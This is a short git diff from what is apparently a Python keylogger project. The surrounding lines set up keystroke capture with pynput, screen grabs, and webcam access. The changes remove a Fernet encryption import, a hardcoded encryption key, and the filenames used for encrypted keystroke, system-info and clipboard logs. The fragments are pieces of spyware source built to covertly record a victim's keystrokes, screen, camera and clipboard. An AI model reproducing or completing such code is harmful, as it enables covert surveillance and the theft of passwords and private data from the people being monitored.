@@ -26,9 +26,6 @@ from PIL import ImageGrab
 #Keystroke module
 from pynput.keyboard import Key, Listener
 
-#Cryptography module for .txt encryption
-from cryptography.fernet import Fernet
-
 #Datetime module
 from datetime import date
 from datetime import datetime
@@ -56,12 +53,6 @@ currentTime = time.time()
 
 #Default camera values
 cam = cv2.VideoCapture(0)
-
-#Encryption
-key = "aK9Aamh-txCxirHhCLEZ-phPxpQRUTEXhBHigOeF30Q="
-keys_information_encrypted = "encrypted_key_log.txt"
-system_information_encrypted = "encrypted_systeminfo.txt"
-clipboard_information_encrypted = "ecrypted_clipboard.txt"
 
 #Filepaths
 file_path = "/Users/rickyanashita/Developer/Python-Keylogger"
